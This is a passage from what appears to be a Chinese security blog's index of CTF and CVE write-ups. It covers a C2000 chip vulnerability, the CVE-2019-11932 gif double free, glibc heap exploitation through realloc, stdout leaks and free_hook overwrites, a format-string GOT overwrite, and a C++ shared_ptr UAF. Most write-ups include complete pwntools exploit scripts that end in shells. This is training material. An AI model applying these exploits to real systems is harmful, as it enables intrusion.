sector进行刷写。\n写在最后C2000的CSM&#x2F;DCSM漏洞究其原因是UnSecureZone可以调用SecureZone中任意位置的代码，这是保护机制实现上的缺陷。相比之下，ARM在SecureZone的实现中加入了NSC(Non-secure Callable)这个中间跳板，UnsecureZone只能通过中间跳板进入SecureZone。\n\n\n相关链接PSIRT Notification C2000 DCSM ROM Gadget&#x2F;ROP VulnerabilityUnderstanding Security Features for C2000 Real-Time Control MCUsDCSM模块使用说明TRUSTZONE TECHNOLOGY\n","categories":["安全研究"],"tags":["芯片"]},{"title":"gif2ascii_CVE_2019_11932","url":"/2020/09/12/gif2ascii-CVE-2019-11932/","content":"CVE-2019-11932分析android-gif-drawable是谷歌开源的一个安卓端gif解析库，可以用来渲染gif，被许多app所应用，如what’s app等知名软件。在android-gif-drawable的v 1.2.17以及之前的版本中存在一个double free的漏洞，该漏洞存在于decoding.c中DDGifSlurp函数中。\n\n如图，newRasterSize的计算是当前这一帧的width*height，但是没有检查结果是否为0，realloc的特性我们知道，当size为0时，ptr会被free。因此，我们伪造两个大小为0的帧，即可使得info-&gt;rasterBits被double free。\n\ninfo-&gt;rasterBits存储着的是Gif帧的压缩数据，因此，我们可以通过伪造帧数据，来控制被double free后造成的UAF的堆里的内容。而在安卓上，double free是不会报错崩溃的。\n\n\n一个比较好的利用手法就是double free一个与GifInfo结构体大小一样的堆，然后让GifInfo这个结构体占据double free后的这个堆，接下来，利用帧数据来覆盖GifInfo这个结构体，劫持rewindFunction这个函数指针，从而在DDGifSlurp函数结尾，通过info-&gt; rewindFunction的调用，来控制程序的流程。\n\n\ngif2ascii出题\n为了模拟安安卓上的情况，libc版本选择为2.27，这样double free不会报错。该程序提供4个功能，upload用于加载gif，select用于选择一个帧，add watermark用于添加水印，convert用于将当前选中的帧转化为ascii。\n其中,watermark水印功能存在地址泄露漏洞，可以将栈上一些数据拷贝到变量里，然后在convert功能里打印ascii时，可以一起打印出来,通过此功能，我们可以泄露出libc、堆、栈等地址。\n\n\n首先随便上传一张正常的gif，利用watermark功能泄露出libc地址和堆地址等。\n\n\n可以看到有地址被泄露出来了。\n\n\n本题，我们的GifInfo结构体大小为0x98，因此，我们需要伪造帧的width*height为0x98为0x90，这里，我们另width和height都为0xC，然后将伪造的数据放进去，通过giflib的编码函数，将数据进行编码，我们的第一帧就构造完成。\n\n\n\n\n\n\n接下来是构造两个大小为0的帧，如图，我们另Width为0即可，然后构造好尾部。这样，一个可利用的gif就构造完成，接下来就是来触发了。\n\n\n通过convert解析gif，制造一个0xA0的堆double free。然后通过再次上传该gif并解析，这样第一帧的内容就会被解码到GifInfo结构体内，从而覆盖GifInfo结构体。\n\n\n\n\n本题的另一个难点在于开启了沙箱，使得程序只能做ROP来读flag，因此，需要利用setcontext进行栈迁移，但是很难控制0xA0和0xA8处的内容，因此，我们找到一条有用的gadget帮我们调整rdi。\n\n\n\n","categories":["CTF","CVE"],"tags":["double free","UAF","realloc"]},{"title":"glibc从堆任意分配到攻击IO流达到泄露信息_realloc特性_unsorted_bin_expand总结","url":"/2020/04/17/glibc%E4%BB%8E%E5%A0%86%E4%BB%BB%E6%84%8F%E5%88%86%E9%85%8D%E5%88%B0%E6%94%BB%E5%87%BBIO%E6%B5%81%E8%BE%BE%E5%88%B0%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF_realloc%E7%89%B9%E6%80%A7_unsorted_bin_expand%E6%80%BB%E7%BB%93/","content":"有些情况下，仅有malloc&#x2F;calloc&#x2F;realloc和free两种功能，并且可以实现任意地址分配，如果想要达到利用，还需要知道地址，在glibc下，一般就是攻击_IO_2_1_stdout_结构体来实现信息泄露，通过低字节覆盖unsorted bin留下的main_arena指针，再加以爆破4位，就能分配到_IO_2_1_stdout_，通过篡改_IO_2_1_stdout_的flags为0x0FBAD1887，_IO_write_base低字节覆盖，然后当程序调用puts输出任意信息时，就会输出_IO_write_base到_IO_write_ptr之间的数据，而这之间就有libc的指针。\n下面以三个例子为例。\nroarctf_2019_realloc_magic题目给我们的glibc版本为2.27\n首先，检查一下程序的保护机制\n\n\n然后用IDA分析一下，很明显存在UAF漏洞\n\n\n功能很少，没有show功能，没有edit功能。\n\n\n注意到，程序使用了realloc来分配，如果realloc_ptr不为空的话，会在realloc_ptr的基础上来分配，因此很难达到任意地址分配。\n\n\n这时，就需要利用**[realloc的一个特性]{.mark}**，阅读realloc的源码，我们发现了如下\n\n\n如果realloc的size为0，并且传入的ptr指针不为空，那么会free掉ptr指向的堆，并**[返回0值。]{.mark}**\n利用这个返回0值，我们就可以将ptr设置为0，只要ptr为0，就和malloc一样的使用。\n首先，我们需要构造出unsorted bin与tcache bin重合的布局，并且为了控制tcache bin chunk的next指针，我们在最前面申请一个chunk0。\n#0realloc(0x40,&#x27;a&#x27;*0x40)#realloc size为0，且传入的chunk不为null，会free掉chunk，并且返回0##重点就在于返回0，使得ptr指针置0realloc(0,&#x27;&#x27;)#1#先申请一个大的堆realloc(0x100,&#x27;a&#x27;*0x100)#再缩小堆，这样，堆与top chunk之间就隔开了realloc(0xC0,&#x27;b&#x27;*0xC0)for i in range(7):   delete()#清空堆指针realloc(0,&#x27;&#x27;)\n\n堆布局成了这样\n\n\n也就是这样的布局\n\n\n现在，我们想控制tcache bin的next指针，我们可以先把chunk0申请回来，再利用realloc扩充到下面的tcache chunk里进行修改。\n#取出0x50的chunkrealloc(0x40,&#x27;c&#x27;*0x40)#扩充，由于chunk1处于free状态，因此与chunk1发生重合#低位覆盖chunk1的next指针，使得有一定几率指向IO_2_1_stdout#同时篡改size，使得下一次释放0xD0的第一个堆时不会重新回到0xD0的chunk里realloc(0x100,&#x27;c&#x27;*0x40 + p64(0) + p64(0x41) + p16((0x5 &lt;&lt; 0xC) + (_IO_2_1_stdout_s &amp; 0xFFF)))\n\n需要注意的是我们**[还篡改了下一个chunk的size为0x41，原本为0xD1。]{.mark}**这是因为当我们把这个0xD0的tcache 申请回来后，我们想要继续申请next指针指向的地方，但是由于使用的是realloc，我们必须保证ptr为0，因此需要realloc(ptr,0)吗，这会使得ptr被free一次，如果size仍然为0xD0，又会重新回到0xD0的tcache bin里，使得我们取不出next指向的地方。\n接下来，就是分配到目的地，改写数据，达到泄露信息了。\n#释放堆，同时指针清零realloc(0,&#x27;&#x27;)#申请0xD0的第一个堆realloc(0xC0,&#x27;c&#x27;*0xC0)#释放堆，chunk放入0x40的tcache bin，同时指针清零realloc(0,&#x27;&#x27;)#申请到IO_2_1_stdout结构体内部，低位覆盖_IO_write_base，使得puts时泄露出信息realloc(0xC0,p64(0x0FBAD1887) +p64(0)*3 + p8(0x58))\n\n结尾这个puts会将数据输出，由于flags被我们改为0x0FBAD1887，因此’x00’不会截断puts的输出。\n\n\n接下来，同样是利用realloc来将下一个chunk包含进来，篡改next指针为free_hook，改写free_hook即可。\n完整的exp\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)_IO_2_1_stdout_s = libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]one_gadget_s = 0x4f322def realloc(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size?&#x27;,str(size))   sh.sendafter(&#x27;Content?&#x27;,content)def delete():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)def zero_ptr():   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;666&#x27;)def exploit():   #0   realloc(0x40,&#x27;a&#x27;*0x40)   #realloc size为0，且传入的chunk不为null，会free掉chunk，并且返回0   ##重点就在于返回0，使得ptr指针置0   realloc(0,&#x27;&#x27;)   #1   #先申请一个大的堆   realloc(0x100,&#x27;a&#x27;*0x100)   #再缩小堆，这样，堆与top chunk之间就隔开了   realloc(0xC0,&#x27;b&#x27;*0xC0)   for i in range(7):      delete()   #清空堆指针   realloc(0,&#x27;&#x27;)   #取出0x50的chunk   realloc(0x40,&#x27;c&#x27;*0x40)   #扩充，由于chunk1处于free状态，因此与chunk1发生重合   #低位覆盖chunk1的next指针，使得有一定几率指向IO_2_1_stdout   #同时篡改size，使得下一次释放0xD0的第一个堆时不会重新回到0xD0的chunk里   realloc(0x100,&#x27;c&#x27;*0x40 + p64(0) + p64(0x41) + p16((0x5 &lt;&lt; 0xC) + (_IO_2_1_stdout_s &amp; 0xFFF)))   #释放堆，同时指针清零   realloc(0,&#x27;&#x27;)   #申请0xD0的第一个堆   realloc(0xC0,&#x27;c&#x27;*0xC0)   #释放堆，chunk放入0x40的tcache bin，同时指针清零   realloc(0,&#x27;&#x27;)   #申请到IO_2_1_stdout结构体内部，低位覆盖_IO_write_base，使得puts时泄露出信息   realloc(0xC0,p64(0x0FBAD1887) +p64(0)*3 + p8(0x58))   #泄露出libc地址   sh.recvuntil(&#x27;\\n&#x27;)   libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x3E82A0   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;error leak!&#x27;)   free_hook_addr = libc_base + free_hook_s   one_gadget_addr = libc_base + one_gadget_s   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)   print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)   #清空ptr指针   zero_ptr()   #取出0x110的chunk，0x40的chunk发生重合   #篡改0x40的tcache bin的chunk的next指针，指向free_hook处   #同时，与上面思想一样，篡改size，使得释放后不会重新回到当前0x40的tcache bin   realloc(0x110,&#x27;c&#x27;*0x40 + p64(0) + p64(0x51) + p64(free_hook_addr))   #释放堆,指针清零   realloc(0,&#x27;&#x27;)   #取出0x40的第一个chunk   realloc(0x30,&#x27;c&#x27;)   #释放堆，chunk放入0x50的tcache bin，同时指针清零   realloc(0,&#x27;&#x27;)   #申请到free_hook处，写free_hook   realloc(0x30,p64(one_gadget_addr))   #getshell   delete()while True:   try:      global sh      sh = process(&#x27;./roarctf_2019_realloc_magic&#x27;)      #sh = remote(&#x27;node3.buuoj.cn&#x27;,28671)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;retrying...&#x27;\n\n\n\nTWCTF_online_2019_asterisk_alloc与roarctf_2019_realloc_magic是基本一样的操作，程序里的calloc功能没有用到。\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)_IO_2_1_stdout_s = libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]one_gadget_s = 0x4f322def malloc(size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendafter(&#x27;Data:&#x27;,content)def calloc(size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendafter(&#x27;Data:&#x27;,content)def realloc(size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendafter(&#x27;Data:&#x27;,content)def free(which):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Which:&#x27;,which)def exploit():   realloc(0x40,&#x27;a&#x27;*0x40)   #realloc特性，当传入的size为0且堆指针不为空时，会free掉chunk   realloc(0,&#x27;&#x27;)   #realloc一个大堆   realloc(0x100,&#x27;b&#x27;*0x100)   #再缩小范围，并且保证剩余的空间大小在fastbin范围，这样chunk就与top chunk隔开了   realloc(0xC0,&#x27;b&#x27;*0xC0)   for i in range(7):      free(&#x27;r&#x27;)   #realloc特性，当传入的size为0且堆指针不为空时，会free掉chunk并返回0   #我们利用返回的0，将ptr_r置零   realloc(0,&#x27;&#x27;)   #取出0x50的chunk   realloc(0x40,&#x27;a&#x27;*0x40)   #扩充0x50的chunk到下方0xD0的chunk里   #低字节覆盖，使得tcache bin chunk的next指针有一定几率指向_IO_2_1_stdout_   realloc(0x100,&#x27;a&#x27;*0x40 + p64(0) + p64(0x41) + p16((0x5 &lt;&lt; 0xC) + (_IO_2_1_stdout_s &amp; 0xFFF)))   #释放堆，同时指针清零   realloc(0,&#x27;&#x27;)   #申请0xD0的第一个堆   realloc(0xC0,&#x27;c&#x27;*0xC0)   #释放堆，chunk放入0x40的tcache bin，同时指针清零   realloc(0,&#x27;&#x27;)   #申请到IO_2_1_stdout结构体内部，低位覆盖_IO_write_base，使得puts时泄露出信息   malloc(0xC0,p64(0x0FBAD1887) +p64(0)*3 + p8(0x58))   sh.recv(1)   #泄露出libc地址   libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x3E82A0   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;error leak!&#x27;)   free_hook_addr = libc_base + free_hook_s   one_gadget_addr = libc_base + one_gadget_s   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)   print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)   #取出0x110的tcache bin chunk，尾部与0x40的tcache bin重合   #我们将free_hook链接到0x40的tcache bin里   realloc(0x110,&#x27;d&#x27;*0x40 + p64(0) + p64(0x51) + p64(free_hook_addr))   #释放堆，指针清零   realloc(0,&#x27;&#x27;)   #取出第一个0x40的tcache bin chunk   realloc(0x30,&#x27;e&#x27;*0x30)   #释放堆，chunk放入0x50的tcache bin，指针清零   realloc(0,&#x27;&#x27;)   #分配到free_hook，写入one_gadget   realloc(0x30,p64(one_gadget_addr))   #getshell   free(&#x27;r&#x27;)while True:   try:      global sh      #sh = process(&#x27;./TWCTF_online_2019_asterisk_alloc&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,27319)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;retrying...&#x27;\n\nsctf_2019_one_heapglibc版本为2.27。\n首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，仅两个功能，add使用的是malloc分配\n\n\nDelete功能里没有清空指针，可以造成double free，delete功能最多只能用4次。\n\n\n首先还是构造unsorted bin与tcache bin重合的布局，由于delete次数只能用4次，我们先double free，然后多次add，使得tcache bin对应的count计数变为负数。由于count为无符号数，因此count&gt;7将成立。从而，我们接下来free的时候就能得到unsorted bin。\n#0add(0x7F,&#x27;a&#x27;*0x7F)#double freedelete()delete()#1add(0x10,&#x27;b&#x27;*0x10)delete()#2add(0x20,&#x27;c&#x27;*0x20)#通过三次add，使得0x90的tcache的count变为-1add(0x7F,&#x27;\\n&#x27;)add(0x7F,&#x27;\\n&#x27;)add(0x7F,&#x27;\\n&#x27;)#获得unsorted bindelete()\n然后就是修改next指针，申请到_IO_2_1_stdout进行劫持来泄露数据了。接下来，delete功能已经用完了。我们还得想办法控制chunk1的next域。此时，用到了**[unsorted bin expand的方法，即将unsorted bin的size篡改大]{.mark}**，将chunk1给包含进来，然后通过分配，使得分配的chunk与free状态的chunk1重合，这样，我们就能控制chunk1的next指针，指向malloc_hook，然后改写即可。\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)_IO_2_1_stdout_s = libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]realloc_s = libc.sym[&#x27;realloc&#x27;]one_gadget_s = 0x10a38cdef add(size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Input the size:&#x27;,str(size))   sh.sendafter(&#x27;Input the content:&#x27;,content)def delete():   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)def exploit():   #0   add(0x7F,&#x27;a&#x27;*0x7F)   #double free   delete()   delete()   #1   add(0x10,&#x27;b&#x27;*0x10)   delete()   #2   add(0x20,&#x27;c&#x27;*0x20)   #通过三次add，使得0x90的tcache的count变为-1   add(0x7F,&#x27;\\n&#x27;)   add(0x7F,&#x27;\\n&#x27;)   add(0x7F,&#x27;\\n&#x27;)   #获得unsorted bin   delete()   #从unsorted bin里切割   #低字节覆盖，使得tcache bin的next指针有一定几率指向_IO_2_1_stdout_   add(0x20,p16((0x5 &lt;&lt; 0xC) + (_IO_2_1_stdout_s &amp; 0xFFF)) + &#x27;\\n&#x27;)   #取出0x90的第一个tcache chunk，同时，修改unsorted bin的size，使得chunk1被包含进来   add(0x7F,&#x27;a&#x27;*0x20 + p64(0) + p64(0x81) + &#x27;\\n&#x27;)   #申请到IO_2_1_stdout结构体内部，低位覆盖_IO_write_base，使得puts时泄露出信息   add(0x7F,p64(0x0FBAD1887) +p64(0)*3 + p8(0x58) + &#x27;\\n&#x27;)   #泄露出libc地址   libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x3E82A0   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;error leak!&#x27;)   malloc_hook_addr = libc_base + malloc_hook_s   one_gadget_addr = libc_base + one_gadget_s   realloc_addr = libc_base + realloc_s   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)   print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)   #从unsorted bin里切割，尾部与chunk1的tcache bin重合，从而我们可以修改next指针   add(0x70,&#x27;a&#x27;*0x60 + p64(malloc_hook_addr - 0x8) + &#x27;\\n&#x27;)   add(0x10,&#x27;b&#x27;*0x10)   #申请到malloc_hook-0x8处   add(0x10,p64(one_gadget_addr) + p64(realloc_addr+4))   #getshell   add(0,&#x27;&#x27;)while True:   try:      global sh      #sh = process(&#x27;./sctf_2019_one_heap&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,28553)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;retrying...&#x27;","categories":["CTF"],"tags":["unsorted bin","UAF","IO FILE","realloc"]},{"title":"greeting-150","url":"/2019/11/09/greeting-150/","content":"首先看一下保护机制\n\n\n然后我们拖入IDA，发现是一个很简单的程序。\n\n\n\n\n然而，最后的那个**printf(&amp;s);**存在格式化字符串漏洞，可以造成任意地址的读写。\n首先，我们需要确定我们输入的数据的相对位置。\n\n\n经过测试，我们需要在前面填充2个字符，然后接下来我们的数据会位于第12个位置\n那么，我们的payload &#x3D; ‘aa’ + p32(address) + ‘%10c%12$n’\n，我们就能把address处的数据写为(10+4+2+strlen(“Nice to meet you,”))这个值\n原理请见https://www.cnblogs.com/ichunqiu/p/9329387.html\n那么，我们可以用这种方式来修改GOT表\n我们可以修改strlen的GOT表内容为system的PLT，然后我们想办法让程序程序回到main，执行strlen，我们输入&#x2F;bin&#x2F;sh，即可get shell\n我们发现，程序结束时，会调用这个地方，我们利用printf把这里也一起修改为main的地址\n\n\n以上两个地方的修改必须在一次完成，并且，我们的payload长度不能大于64，因为程序最多读取64个字符，因此，我们精心布置payload。并且，我们应该拆分4字节，分开写，不要，printf()需要输出很多字符，假如我们要让目标地址存入main_addr，如果我们是\npayload &#x3D; ‘aa’ + p32(fini_got) + “%” + str(main_addr -4 -2 – strlen(“Nice to meet you,”)) + ‘c%12$n’，那么printf需要输出main_addr这么多个字符，也就是\n0x80485ED &#x2F; 1024 &#x2F; 1024 &#x3D; 128MB，这是非常低效的。因此，我们有另一种方法。在printf的格式化修饰符中，hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)\n\nfini_got &#x3D; 0x8049934  \n\nmain_addr &#x3D; 0x80485ED  \n\nstrlen_got &#x3D; 0x8049A54  \n\nsystem_plt &#x3D; 0x8048490\n\n\n  \n此处的数据，只有后2字节与main_addr不一样，因此，我们只需要修改后两字节\n\n\n然后就是strlen的GOT表内容，四个字节我们都需要修改，我们拆分为2个2字节写。\narr = [  0x85ED,0x8490,0x804  ]  \n\n由于因特尔处理器小端存储，因此，我们要在fini_got写入2字节数据arr[0]\n在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]\n我们应该按照数据的大小，从小到大的顺序写。\n那么，我们需要先写0x804这个数据，再写0x8490,再写0x85ED(想想为什么?)，这样，printf总共输出了0x85ED个字符，也就是33KB大小的数据，效率提升了近4000倍\n#coding:utf8  from pwn import *    #sh = process(&#x27;./pwnh16&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,47556)    fini_got = 0x8049934  main_addr = 0x80485ED  strlen_got = 0x8049A54  system_plt = 0x8048490    sh.recvuntil(&#x27;Please tell me your name... &#x27;)    #通过观察,这几个地址只有后2字节不一样  payload = &#x27;a&#x27;*2  payload += p32(strlen_got)  payload +=  p32(strlen_got+2)  payload += p32(fini_got)    arr = [     0x85ED,     0x8490,0x804  ]    #注意，我们的payload长度不能超过64，不然后面的都读取不到，因为最多输入64个字符    #hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  #修改strlen GOT内容的前2字节  num = arr[2] - 32  payload += &#x27;%&#x27; + str(num) + &#x27;c%13$hn&#x27;  #修改strlen GOT内容的后2字节  num = arr[1] - arr[2]  payload += &#x27;%&#x27; + str(num) + &#x27;c%12$hn&#x27;  #修改fini的后2字节  num = arr[0] - arr[1]  payload += &#x27;%&#x27; + str(num) + &#x27;c%14$hn&#x27;    print len(payload)    sh.sendline(payload)    #get shell    sh.recvuntil(&#x27;Please tell me your name... &#x27;)    sh.sendline(&#x27;/bin/sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["格式化字符串漏洞"]},{"title":"gyctf_2020_foolish_query(C++中的shared ptr指针的误用)","url":"/2020/07/26/gyctf_2020_foolish_query/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在Query的构造函数中，如果我们查询的name存在，则将对应的对象从容易里取出，获得其shared_ptr对象，关键在于调用了shared ptr的get函数，取得了对象的指针值，用这个指针值创建了一个新的shared_ptr对象。漏洞点在于，从一个shared_ptr对象里取得了被托管的对象的地址值创建了一个新的shared_ptr对象，因此，前面shard_ptr指针里的计数不会被传递给新创建的这个shared_ptr对象，因此这个局部的shared_ptr对象析构时，把受托管的对象也给free掉了。\n\n\n因此，我们第一次query，创建了一个对象，第二次query这个对象，将使得该对象被free，第三次query将使得程序崩溃，原因是结构体里的指针由于free被破坏了。经过分析，对象的结构体是这样的\nstruct Node &#123;   void *func_tables;   string name;&#125;\n\n由于UAF，我们可以通过feedback申请堆，将释放的这个结构体申请回来进行伪造。首先，我们通过feedback功能，可以直接获得堆地址\n\n\n那么我们把伪造的虚表存到堆里先。\n_ZN9WordQueryD2Ev = 0x000000000040BF00_ZN9WordQueryD0Ev = 0x000000000040BF50_ZNK9WordQuery4evalERK9TextQuery = 0x000000000040BDB0_ZNK9WordQuery3repB5cxx11Ev = 0x000000000040BE08_Z11secertQueryv = 0x0000000000402EA9#伪造虚表feedback(p64(_ZN9WordQueryD2Ev) + p64(_ZN9WordQueryD0Ev) + p64(_ZNK9WordQuery4evalERK9TextQuery) + p64(_ZNK9WordQuery3repB5cxx11Ev))\n\n这个伪造的虚表与程序原来真正的虚表是一模一样的，因为第一步我们的目的不是执行代码，我们得伪造Node结构体里的string对象，进而能够读取任意地址，从而泄露libc地址。\nbasic_query(&#x27;a&#x27;*0x8)#UAFbasic_query(&#x27;a&#x27;*0x8)feedback(p64(fake_vtable_addr) + p64(heap_addr - 0x30) + p64(0x100) + &#x27;a&#x27;*0x8) #remote\n\n如上，我们这一步主要是控制了string对象， \n因为每次query，都会打印出name，因此控制name，我们可以读取堆里任意地址的数据，我们在后面再通过feedback功能，由于feedback里string对象的扩充，会得到unsorted bin，从而，我们进行query的时候可以泄露unsorted bin里的数据。我们只需要控制string对象里的length成员，即可控制数据泄露的长度。\n#制造一个unsorted binfeedback(&#x27;b&#x27;*0x200)#泄露出数据basic_query(&#x27;a&#x27;*0x8)result = sh.recvuntil(&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;,drop = True)main_arena_88 = u64(result[-8:])\n\n泄露出数据以后，由于找不到合适的one_gadget，因此，我们只能做栈迁移。通过调试，我们发现，在函数虚表里的第三个函数调用时，寄存器状态如下\n\n\n其中rax指向的就是这个对象，而[rax]指向的就是虚表。我们找到一个合适的gadget\nmov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x20]\n\n因为虚表指针我们可以任意控制，所以rdi的值，我们也可以任意控制，从而rax也可以控制，我们再结合setcontext，即可完成栈迁移，然后做ROP。因此，第二次虚表伪造，我们将第三个函数指针伪造为这个gadget的地址。\n#coding:utf8from pwn import *context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./gyctf_2020_foolish_query&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)#sh = process(&#x27;./gyctf_2020_foolish_query&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29002)#sh = remote(&#x27;127.0.0.1&#x27;,8666)libc = ELF(&#x27;./libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]def basic_query(keyword):   sh.sendlineafter(&#x27;6. Exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Keyword:&#x27;,keyword)def feedback(content):   sh.sendlineafter(&#x27;6. Exit&#x27;,&#x27;5&#x27;)   sh.sendlineafter(&#x27;You want to feedback huh?&#x27;,content)_ZN9WordQueryD2Ev = 0x000000000040BF00_ZN9WordQueryD0Ev = 0x000000000040BF50_ZNK9WordQuery4evalERK9TextQuery = 0x000000000040BDB0_ZNK9WordQuery3repB5cxx11Ev = 0x000000000040BE08_Z11secertQueryv = 0x0000000000402EA9#伪造虚表feedback(p64(_ZN9WordQueryD2Ev) + p64(_ZN9WordQueryD0Ev) + p64(_ZNK9WordQuery4evalERK9TextQuery) + p64(_ZNK9WordQuery3repB5cxx11Ev))sh.recvuntil(&#x27;reward: &#x27;)heap_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)fake_vtable_addr = heap_addr + 0x50print &#x27;fake_vtable_addr=&#x27;,hex(fake_vtable_addr)basic_query(&#x27;a&#x27;*0x8)#UAFbasic_query(&#x27;a&#x27;*0x8)feedback(p64(fake_vtable_addr) + p64(heap_addr - 0x30) + p64(0x100) + &#x27;a&#x27;*0x8) #remote#制造一个unsorted binfeedback(&#x27;b&#x27;*0x200)#泄露出数据basic_query(&#x27;a&#x27;*0x8)result = sh.recvuntil(&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#x27;,drop = True)main_arena_88 = u64(result[-8:])malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_ssystem_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()pop_rdi = libc_base + 0x0000000000021102#mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x20]trans_reg = libc_base + 0x0000000000136aa3setcontext_x = libc_base + libc.sym[&#x27;setcontext&#x27;] + 0x35print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;setcontext_x=&#x27;,hex(setcontext_x)print &#x27;system_addr=&#x27;,hex(system_addr)#伪造虚表payload = &#x27;v&#x27;*0x10 + p64(trans_reg) + p64(_ZNK9WordQuery3repB5cxx11Ev)payload = payload.ljust(0x38,&#x27;c&#x27;)payload += p64(heap_addr + 0x32510)payload += p64(setcontext_x)rop = p64(binsh_addr) + p64(system_addr)payload += roppayload = payload.ljust(0xA0,&#x27;c&#x27;)payload += p64(heap_addr + 0x32538)payload += p64(pop_rdi)feedback(payload)fake_vtable_addr = heap_addr + 0x324F0feedback(p64(fake_vtable_addr) + p64(heap_addr + 0x98) + p64(0x8) + &#x27;a&#x27;*0x8)#getshellbasic_query(&#x27;a&#x27;*0x8)sh.interactive()","categories":["CTF"],"tags":["unsorted bin","UAF","C++ string","堆风水","C++ shared_ptr"]},{"title":"hack_lu_2018_heap_heaven","url":"/2020/07/25/hack_lu_2018_heap_heaven/","content":"首先，检查一下程序的保护机制\n\n\n然后我们用IDA分析一下，这个free没有检查范围，因此可以任意地址free。\n\n\n我们只要想办法free掉state，然后控制funcs指针，即可执行任意代码\n\n\n但是程序中我们不能自己malloc，因此无法将其再申请回来进行控制。查看state结构体\n\n\n其位置与堆块的fd位置一样，因此，我们首先在fastbin里放一个chunk，然后再free掉state，这样，funcs就指向了第一个chunk，而funcs是一个虚表指针，因此，我们只需在第一个chunk里事先伪造好虚表即可。\n而show功能，其使用的是*v2，因此，我们free掉一个unsorted bin范围的chunk，那么puts(*v2)也就是puts(main_arena_88)，可以泄露出top chunk的地址，从而可以得到state的地址，然后再利用edit低字节覆盖指针，继续泄露libc地址等。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./hack_lu_2018_heap_heaven&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27447)libc = ELF(&#x27;./libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf02a4def edit(offset,size,payload):   sh.sendlineafter(&#x27;[5] : exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;write?&#x27;,str(size))   sh.sendlineafter(&#x27;offset?&#x27;,str(offset))   sleep(0.1)   sh.send(payload)def delete(offset):   sh.sendlineafter(&#x27;[5] : 